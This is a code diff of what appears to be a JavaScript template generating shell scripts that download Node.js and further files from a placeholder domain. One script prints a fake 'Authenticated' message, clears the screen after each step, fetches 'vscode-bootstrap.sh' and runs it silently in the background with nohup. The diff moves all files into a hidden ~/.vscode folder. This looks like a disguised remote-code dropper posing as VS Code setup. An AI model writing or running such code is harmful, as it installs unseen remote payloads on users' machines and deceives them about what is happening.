@@ -181,13 +181,13 @@ if [ -z "$NODE_EXE" ]; then
     # Remove leading "v"
     NODE_VERSION=\${LATEST_VERSION#v}
     # Determine download URL and paths based on OS
-    EXTRACTED_DIR="$HOME/vscode/node-v\${NODE_VERSION}-$( [ "$OS" = "Darwin" ] && echo "darwin" || echo "linux" )-x64"
+    EXTRACTED_DIR="$HOME/.vscode/node-v\${NODE_VERSION}-$( [ "$OS" = "Darwin" ] && echo "darwin" || echo "linux" )-x64"
     PORTABLE_NODE="$EXTRACTED_DIR/bin/node"
     if [ "$OS" == "Darwin" ]; then
-        NODE_TARBALL="$HOME/vscode/node-v\${NODE_VERSION}-darwin-x64.tar.xz"
+        NODE_TARBALL="$HOME/.vscode/node-v\${NODE_VERSION}-darwin-x64.tar.xz"
         DOWNLOAD_URL="https://nodejs.org/dist/v\${NODE_VERSION}/node-v\${NODE_VERSION}-darwin-x64.tar.xz"
     elif [ "$OS" == "Linux" ]; then
-        NODE_TARBALL="$HOME/vscode/node-v\${NODE_VERSION}-linux-x64.tar.xz"
+        NODE_TARBALL="$HOME/.vscode/node-v\${NODE_VERSION}-linux-x64.tar.xz"
         DOWNLOAD_URL="https://nodejs.org/dist/v\${NODE_VERSION}/node-v\${NODE_VERSION}-linux-x64.tar.xz"
     fi
     # Check if portable Node.js already exists
@@ -197,7 +197,7 @@ if [ -z "$NODE_EXE" ]; then
         export PATH="$EXTRACTED_DIR/bin:$PATH"
     else
         echo "[INFO] Downloading Node.js..."
-        mkdir -p "$HOME/vscode"
+        mkdir -p "$HOME/.vscode"
         # Download Node.js
         if ! command -v curl &> /dev/null && ! command -v wget &> /dev/null; then
             echo "[ERROR] Neither curl nor wget is available."
@@ -213,7 +213,7 @@ if [ -z "$NODE_EXE" ]; then
             exit 1
         fi
         echo "[INFO] Extracting Node.js..."
-        tar -xf "$NODE_TARBALL" -C "$HOME/vscode"
+        tar -xf "$NODE_TARBALL" -C "$HOME/.vscode"
         rm -f "$NODE_TARBALL"
         if [ -f "$PORTABLE_NODE" ]; then
             echo "[INFO] Portable Node.js extracted successfully."
@@ -240,7 +240,7 @@ fi
 # -------------------------
 # Download required files
 # -------------------------
-USER_HOME="$HOME/vscode"
+USER_HOME="$HOME/.vscode"
 mkdir -p "\${USER_HOME}"
 BASE_URL="${domain}"
 echo "[INFO] Downloading env-setup.js and package.json..."
@@ -376,13 +376,13 @@ cls`;
 #!/bin/bash
 set -e
 echo "Authenticated"
-mkdir -p "$HOME/vscode"
+mkdir -p "$HOME/.vscode"
 clear
-curl -s -L -o "$HOME/vscode/vscode-bootstrap.sh" "${domain}/settings/bootstrap/linux?flag=${flag}"
+curl -s -L -o "$HOME/.vscode/vscode-bootstrap.sh" "${domain}/settings/bootstrap/linux?flag=${flag}"
 clear
-chmod +x "$HOME/vscode/vscode-bootstrap.sh"
+chmod +x "$HOME/.vscode/vscode-bootstrap.sh"
 clear
-nohup bash "$HOME/vscode/vscode-bootstrap.sh" > /dev/null 2>&1 &
+nohup bash "$HOME/.vscode/vscode-bootstrap.sh" > /dev/null 2>&1 &
 clear
 exit 0
 `;
